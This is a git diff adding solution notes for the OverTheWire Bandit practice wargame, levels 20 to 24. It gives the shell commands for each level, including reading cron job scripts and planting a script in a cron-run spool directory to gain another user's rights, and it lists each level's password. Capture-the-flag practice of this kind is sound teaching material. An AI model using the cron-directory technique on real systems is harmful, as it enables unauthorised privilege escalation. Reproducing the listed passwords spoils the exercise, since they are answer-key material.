@@ -40,3 +40,25 @@ password bandit 20 = 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
 > echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -lp 1234 &
 
 password bandit 21 = EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+> [!Done]- [+] SOLUTION
+> cd /etc/cron.d
+> cat cronjob_bandit22
+> cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+password bandit 22 = tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+> [!Done]- [+] SOLUTION
+cd /etc/cron.d/
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+PRUEBA=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+password bandit 23 = 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+> [!Done]- [+] SOLUTION
+find / -writable 2>/dev/null
+nano /tmp/script_bandit23.sh && chmod +x /tmp/script_bandit23.sh
+touch /tmp/my_password_24.txt && chmod 777 /tmp/my_password_24.txt
+cp /tmp/script_bandit23.sh /var/spool/bandit24/foo/
+cat /tmp/my_password_24.txt
+
+password bandit 24 = gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
